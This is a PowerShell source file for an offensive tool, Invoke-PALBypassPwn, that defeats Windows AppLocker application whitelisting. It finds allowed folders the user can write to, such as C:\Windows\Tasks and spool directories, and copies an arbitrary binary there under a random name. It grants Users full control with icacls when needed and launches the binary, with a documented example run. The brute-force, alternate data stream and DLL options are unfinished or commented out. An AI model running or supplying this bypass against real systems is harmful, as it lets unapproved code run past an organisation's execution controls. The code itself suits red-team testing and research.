function Invoke-PALBypassPwn
{
<#
.SYNOPSIS

Gets AppLocker rules that can be exploited and executes specified binary.

Author: @oddvarmoe
License: BSD 3-Clause
Required Dependencies: ICACLS.exe, Get-PALWriteableAllowedPaths
Optional Dependencies: None

.DESCRIPTION

Gets all allowed AppLocker Paths from Get-PalWriteableAllowedPaths and places the binary you want into
an allowed path and executes.

.PARAMETER BinaryFile

The binaryfile you want to execute. Needs to be full path: C:\folder\file.exe    

.EXAMPLE

PS C:\> Invoke-PALBypassPwn -BinaryFile C:\folder\ba.exe

[*] Running Invoke-AppLockerBypassPwn

[*] Trying to Pwn using modifiable paths that AppLocker allows
[*] Getting modifiable paths allowed by AppLocker Path rules - Be patient!
[+] Got the following EXE paths that is modifiable

Path
----
C:\Program Files (x86)\Dummy\Logs
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\Tasks
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\Tasks
C:\Windows\SysWOW64\com\dmp

[+] Copying binary file 7af064a7-f8cb-4486-8de8-de9aae9fffcb.exe to @{Path=C:\Program Files (x86)\Dummy\Logs}

[+] Setting ACL using ICALCS giving Users full control of 7af064a7-f8cb-4486-8de8-de9aae9fffcb.exe
[+] Trying to start binary file 7af064a7-f8cb-4486-8de8-de9aae9fffcb.exe
[+] Process launched - The world is ours!
[+] Remember to delete - C:\Program Files (x86)\Dummy\Logs\7af064a7-f8cb-4486-8de8-de9aae9fffcb.exe
#>
    [CmdletBinding()] Param (
        [parameter(Mandatory=$true)]
        [String]$BinaryFile,

        [ValidateSet("Exe","Dll")]
        [parameter(Mandatory=$true)]
        [String]$Type,

        [Switch]$BruteForce,

        [Switch]$ADS
    )
    Process
    {
        Try
        {
            "`n[*] Running Invoke-AppLockerBypassPwn"
            
            "`n[*] Trying to Pwn using modifiable paths that AppLocker allows"
            "[*] Getting modifiable paths allowed by AppLocker Path rules - Be very patient!"
            # Find paths allowed by rules, plant binary/dll and execute
            $Paths = Get-PALWriteableAllowedPaths
            $DllPaths = $Paths | where{$_.name -eq "Dll"} | Select-Object Path -Unique
            $ExePaths = $Paths | where{$_.name -eq "Exe"} | Select-Object Path -Unique
            $AppxPaths = $Paths | where{$_.name -eq "Appx"} | Select-Object Path -Unique
            $ScriptPaths = $Paths | where{$_.name -eq "Script"} | Select-Object Path -Unique
            $MSIPaths = $Paths | where{$_.name -eq "Msi"} | Select-Object Path -Unique
            
            if($Type -eq "Exe")
            {
                if($ExePaths)
                {
                    "[+] Got the following EXE paths that are modifiable"
                    $ExePaths
                    $RandomExePath = $ExePaths[(Get-Random -Minimum 0 -Maximum $ExePaths.Count)]
                    "`n[*] Picking random Path to try"
                    "[+] $($RandomExePath.path) was choosen"
                    
                    if($BruteForce)
                    {
                        Write-host "NOT IMPLEMENTED YET! Stopping!"
                        break
                        foreach($Ex in $ExePaths)
                        {
                            $RandomFileName = [System.Guid]::NewGuid().ToString()+".exe"
                            if($ADS)
                            {
                                "`n[+] Copying binary file $RandomFileName to ADS in $($Ex.path)"
                                Get-Content $BinaryFile -Raw | set-content -path $ex.path -Stream $RandomFileName
                                Write-Verbose "$ex.path\:$randomfilename"
                                $CMDLine = "$($Ex.path):$RandomFileName"
                                "[+] Trying to start binary file $CMDLine"
                                Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $CMDLine}

                                sleep 3
                                $ProcessActive = get-process | where{$_.path -eq $CMDLine} -ErrorAction SilentlyContinue
                                if($ProcessActive -eq $null)
                                {
                                    "[-] Process failed to launched from $CMDLine"
                                    "[-] You need to manually remove the binary: $CMDLine"
                                    "Remove-item $($Ex.Path) -stream $RandomFileName"
                                }
                                else
                                {
                                    "[+] Process launched - The world is ours!"
                                    "[-] You need to manually remove the binary: $CMDLine"
                                    "Remove-item $($Ex.Path) -stream $RandomFileName"
                                    break
                                }
                            }
                            else
                            {
                                #Normal execution of file
                                "`n[+] Copying binary file $RandomFileName to $($Ex.path)"
                                copy-item -Path $BinaryFile -Destination (join-path $Ex.path $RandomFileName)
                                #####"`n[+] Setting ACL using ICALCS giving Users full control of $RandomFileName"
                                #####icacls $pth"\"$tempname /grant "BUILTIN\Users:(F)" | Out-Null
                            
                            
                                "[+] Trying to start binary file $RandomFileName"
                                & (join-path $Ex.Path $RandomFileName)
                                
                                sleep 3
                                $ProcessActive = get-process | where{$_.path -eq $(join-path $Ex.Path $RandomFileName)} -ErrorAction SilentlyContinue
                                if($ProcessActive -eq $null)
                                {
                                    "[-] Process failed to launched from (join-path $Ex.Path $RandomFileName)"
                                    "[-] Remving copied binary: (join-path $Ex.Path $RandomFileName)"
                                    remove-item (join-path $Ex.Path $RandomFileName)
                                }
                                else
                                {
                                    "[+] Process launched - The world is ours!"
                                    "[+] Remember to delete - $(join-path $Ex.Path $RandomFileName)"
                                    "Remove-item $(join-path $Ex.Path $RandomFileName)"
                                    break
                                }
                            }
                        }
                    }
                    else #Only try one time and stop if failed
                    {
                        $RandomFileName = [System.Guid]::NewGuid().ToString()+".exe"
                        if($ADS)
                        {
                            #IF GET ACL FAILS - Its not worth it
                            #$ACL = get-acl -Path $($RandomExePath.path)
                            if($ACL)
                            {
                                #"[+] Copying binary file $RandomFileName to ADS in $($RandomExePath.path)"
                                #Get-Content $BinaryFile -Raw | set-content -path $RandomExePath.path -Stream $RandomFileName -ErrorAction Stop
                                #Write-Verbose "$RandomExePath.path\:$randomfilename"
                                #$CMDLine = "$($RandomExePath.path):$RandomFileName"
                                #"[+] Setting ACL using ICALCS giving Users full control on $CMDLine"
                                #icacls $CMDLine /grant "BUILTIN\Users:(F)"                          
                                #if($LASTEXITCODE -eq 0)
                                #{
                                #    "[+] Trying to start binary file $CMDLine"
                                #    Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $CMDLine}
                                #
                                #    sleep 3
                                #    $ProcessActive = get-process | where{$_.path -eq $CMDLine} -ErrorAction SilentlyContinue
                                #    if($ProcessActive -eq $null)
                                #    {
                                #        "[-] Process failed to launched from $CMDLine"
                                #        "[-] You need to manually remove the binary: $CMDLine"
                                #        "Remove-item $($RandomExePath.Path) -stream $RandomFileName"
                                #    }
                                #    else
                                #    {
                                #        "[+] Process launched - The world is ours!"
                                #        "[-] You need to manually remove the binary: $CMDLine"
                                #        "Remove-item $($RandomExePath.Path) -stream $RandomFileName"
                                #        break
                                #    }
                                #}
                                #else
                                #{
                                #    "[-] Not able to change ACLs on file - Will stop execution and cleanup - Try again"
                                #    ##remove-item (join-path $RandomExePath.Path $RandomFileName)
                                #    break
                                #}
                            }
                            else
                            {
                                #ACL not readable
                                write-error "ACL not working"
                            }
                        }
                        else
                        {
                            #Normal execution of file
                            "`n[+] Copying binary file $RandomFileName to $($RandomExePath.path)"
                            copy-item -Path $BinaryFile -Destination (join-path $RandomExePath.path $RandomFileName)
                            $JoinedPath = $($RandomExePath.Path+"\"+$RandomFileName)
                            
                            $user = $env:USERNAME
                            "`n[+] Checking ACL on $JoinedPath"
                            if((get-acl -path $JoinedPath).AccessToString -match "Users.*Allow.*ReadAndExecute" -or (get-acl -path $JoinedPath).AccessToString -match "Users.*Allow.*FullControl" -or (get-acl -path $JoinedPath).AccessToString -match "$user.*Allow.*FullControl" -or (get-acl -path $JoinedPath).AccessToString -match "$user.*Allow.*ReadAndExecute")
                            {
                                "[+] ACL's all good on $JoinedPath"
                            }
                            else
                            {
                                "[+] Lackin correct ACL on $JoinedPath"
                                "[+] Setting ACL using ICALCS giving Users full control on $JoinedPath"
                                icacls $JoinedPath /grant "BUILTIN\Users:(F)" 
                                if($LASTEXITCODE -ne 0)
                                {
                                    "[-] Not able to change ACLs on file - Will stop execution and cleanup - Rerun function"
                                    remove-item (join-path $RandomExePath.Path $RandomFileName)
                                    break
                                }
                            }

                            "[+] Trying to start binary file $RandomFileName"
                            Invoke-Expression $(join-path $RandomExePath.Path $RandomFileName) -ErrorAction Stop
                            
                            #Check if process was launched
                            Sleep 5
                            $ProcessActive = get-process | where{$_.path -eq $(join-path $RandomExePath.Path $RandomFileName)} -ErrorAction SilentlyContinue
                            if($ProcessActive -eq $null)
                            {
                                "[-] Process failed to launched from $(join-path $RandomExePath.Path $RandomFileName)"
                                "[-] Remving copied binary: $(join-path $RandomExePath.Path $RandomFileName)"
                                remove-item $(join-path $RandomExePath.Path $RandomFileName)
                            }
                            else
                            {
                                "[+] Process launched - The world is ours!"
                                "[+] [Manual action needed] Remember to delete - $(join-path $RandomExePath.Path $RandomFileName)"
                                "Remove-item $(join-path $RandomExePath.Path $RandomFileName)" | clip
                                "[+] Command added to clipboard"
                                "Remove-item $(join-path $RandomExePath.Path $RandomFileName)"
                                break
                            }
                        }
                    }
                }
                else
                {
                    "[-] Got none EXE paths that are writable :-("
                }
            }

            if($Type -eq "Dll")
            {
                Write-error "Not implemented yet"
            }
        }
        Catch
        {
            write-error $_
        }
        Finally{}
    }
}